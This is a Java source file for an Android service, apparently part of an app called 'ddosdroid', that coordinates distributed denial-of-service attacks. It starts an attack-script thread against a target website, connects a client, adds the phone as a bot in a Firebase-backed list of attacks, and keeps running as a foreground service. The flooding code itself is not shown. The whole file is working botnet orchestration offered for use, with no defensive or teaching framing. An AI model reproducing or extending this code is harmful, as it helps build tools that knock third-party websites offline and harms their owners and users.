package gr.kalymnos.sk3m3l10.ddosdroid.mvc_model.attack.service;

import android.app.Notification;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.support.annotation.NonNull;
import android.support.v4.app.NotificationCompat;
import android.util.Log;
import android.widget.Toast;

import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.Future;
import java.util.concurrent.TimeUnit;

import gr.kalymnos.sk3m3l10.ddosdroid.R;
import gr.kalymnos.sk3m3l10.ddosdroid.mvc_controllers.activities.AllAttackListsActivity;
import gr.kalymnos.sk3m3l10.ddosdroid.mvc_model.attack.connectivity.client.Client;
import gr.kalymnos.sk3m3l10.ddosdroid.mvc_model.attack.repository.AttackRepository;
import gr.kalymnos.sk3m3l10.ddosdroid.mvc_model.attack.repository.FirebaseRepository;
import gr.kalymnos.sk3m3l10.ddosdroid.pojos.attack.Attack;
import gr.kalymnos.sk3m3l10.ddosdroid.pojos.attack.Attacks;
import gr.kalymnos.sk3m3l10.ddosdroid.pojos.attack.Constants;
import gr.kalymnos.sk3m3l10.ddosdroid.pojos.bot.Bots;

import static gr.kalymnos.sk3m3l10.ddosdroid.mvc_model.attack.service.AttackService.ForegroundNotification.NOTIFICATION_ID;
import static gr.kalymnos.sk3m3l10.ddosdroid.pojos.attack.Constants.AttackType.TYPE_FETCH_JOINED;

public class AttackService extends Service implements Client.ClientConnectionListener {
    private static final String TAG = "AttackService";

    private Map<String, Client> clients;
    private Map<String, Thread> tasks;
    private AttackRepository repo;

    @Override
    public void onCreate() {
        super.onCreate();
        initializeFields();
    }

    private void initializeFields() {
        tasks = new HashMap<>();
        clients = new HashMap<>();
        repo = new FirebaseRepository();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Attack attack = intent.getParcelableExtra(Constants.Extra.EXTRA_ATTACK);
        switch (intent.getAction()) {
            case Action.ACTION_START_ATTACK:
                handleStartAttackAction(attack);
                return START_REDELIVER_INTENT;
            case Action.ACTION_STOP_ATTACK:
                handleStopAttackAction(attack);
                return START_REDELIVER_INTENT;
            case Action.ACTION_STOP_SERVICE:
                stopSelf(); // onDestroy() will be called clearing resources
                return START_NOT_STICKY;
            default:
                return super.onStartCommand(intent, flags, startId);
        }
    }

    private void handleStartAttackAction(Attack attack) {
        boolean clientForAttackExists = clients.containsKey(attack.getPushId());
        if (!clientForAttackExists) {
            Client client = createClient();
            client.connect(this, attack);
        } else {
            Toast.makeText(this, R.string.already_attacking_label, Toast.LENGTH_SHORT).show();
        }
    }

    @NonNull
    private Client createClient() {
        Client client = new Client();
        client.setClientConnectionListener(this);
        return client;
    }

    private void handleStopAttackAction(Attack attack) {
        cancelTaskExecutionOf(attack);
        disconnectClientOf(attack);
        if (isLastAttack(attack)) {
            Action.stopService(this);
        }
    }

    private void cancelTaskExecutionOf(Attack attack) {
        if (tasks.containsKey(attack.getPushId())) {
            Thread attackScript = tasks.get(attack.getPushId());
            attackScript.interrupt();
            if (attackScript.isInterrupted()) {
                tasks.remove(attackScript);
            }
        }
    }

    private void disconnectClientOf(Attack attack) {
        if (clients.containsKey(attack.getPushId())) {
            Client client = clients.get(attack.getPushId());
            client.disconnect();
            clients.remove(client);
        }
    }

    private boolean isLastAttack(Attack attack) {
        return tasks.containsKey(attack.getPushId()) && tasks.size() == 1;
    }

    @Override
    public void onClientConnected(Client thisClient, Attack attack) {
        AttackScript script = new AttackScript(attack.getWebsite());
        script.start();
        addLocalBotAndUpdate(attack);
        saveReferences(thisClient, attack, script);
        startForeground(NOTIFICATION_ID, new ForegroundNotification().createNotification());
    }

    private void addLocalBotAndUpdate(Attack attack) {
        Attacks.addBot(attack, Bots.getLocalUser());
        repo.updateAttack(attack);
    }

    private void saveReferences(Client thisClient, Attack attack, Thread script) {
        clients.put(attack.getPushId(), thisClient);
        tasks.put(attack.getPushId(), script);
    }

    @Override
    public void onClientConnectionError() {
        Toast.makeText(this, R.string.client_connection_error_msg, Toast.LENGTH_SHORT).show();
        if (clients.isEmpty() && tasks.isEmpty())
            stopSelf();
    }

    @Override
    public void onClientDisconnected(Client thisClient, Attack attack) {
        Action.stopAttack(attack, this);
        Toast.makeText(this, R.string.client_disconnected_msg, Toast.LENGTH_SHORT).show();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        stopTasks();
        disconnectClients();
    }

    private void stopTasks() {
        for (Map.Entry<String, Thread> taskEntry : tasks.entrySet()) {
            taskEntry.getValue().interrupt();
            Log.d(TAG, taskEntry.getValue().isInterrupted() ? "A task was stopped" : "A task was NOT stopped");
        }
    }

    private void disconnectClients() {
        for (Map.Entry<String, Client> clientEntry : clients.entrySet()) {
            clientEntry.getValue().disconnect();
        }
    }

    class ForegroundNotification {
        static final String CHANNEL_ID = TAG + "channel id";
        static final int NOTIFICATION_ID = 291919;
        static final int CONTENT_INTENT_REQUEST_CODE = 2932;
        static final int STOP_INTENT_REQUEST_CODE = 2933;

        Notification createNotification() {
            return createNotificationBuilder().build();
        }

        NotificationCompat.Builder createNotificationBuilder() {
            return new NotificationCompat.Builder(AttackService.this, CHANNEL_ID)
                    .setSmallIcon(R.drawable.ic_fist)
                    .setContentTitle(getString(R.string.client_notification_title))
                    .setContentText(getString(R.string.client_notification_small_text))
                    .setStyle(new NotificationCompat.BigTextStyle().bigText(getString(R.string.client_notification_big_text)))
                    .setPriority(NotificationCompat.PRIORITY_DEFAULT)
                    .setContentIntent(createContentPendingIntent())
                    .addAction(R.drawable.ic_stop, getString(R.string.shutdown_label), createStopServicePendingIntent());
        }

        PendingIntent createContentPendingIntent() {
            Intent intent = AllAttackListsActivity.Action.createIntent(AttackService.this, TYPE_FETCH_JOINED, R.string.joined_attacks_label);
            return PendingIntent.getActivity(AttackService.this, CONTENT_INTENT_REQUEST_CODE, intent, PendingIntent.FLAG_UPDATE_CURRENT);
        }

        PendingIntent createStopServicePendingIntent() {
            Intent intent = new Intent(AttackService.this, AttackService.class);
            intent.setAction(Action.ACTION_STOP_SERVICE);
            return PendingIntent.getService(AttackService.this, STOP_INTENT_REQUEST_CODE, intent, PendingIntent.FLAG_UPDATE_CURRENT);
        }
    }

    public static class Action {
        private static final String ACTION_STOP_ATTACK = TAG + "stop attack action";
        private static final String ACTION_STOP_SERVICE = TAG + "stop service action";
        private static final String ACTION_START_ATTACK = TAG + "start attack action";

        public static void startAttack(Attack attack, Context context) {
            context.startService(createIntentWithAttackExtra(context, attack, ACTION_START_ATTACK));
        }

        public static void stopAttack(Attack attack, Context context) {
            context.startService(createIntentWithAttackExtra(context, attack, ACTION_STOP_ATTACK));
        }

        private static Intent createIntentWithAttackExtra(Context context, Attack attack, String action) {
            Intent intent = new Intent(context, AttackService.class);
            intent.setAction(action);
            intent.putExtra(Constants.Extra.EXTRA_ATTACK, attack);
            return intent;
        }

        public static void stopService(Context context) {
            context.startService(createStopServiceIntent(context));
        }

        @NonNull
        private static Intent createStopServiceIntent(Context context) {
            Intent intent = new Intent(context, AttackService.class);
            intent.setAction(ACTION_STOP_SERVICE);
            return intent;
        }

    }
}
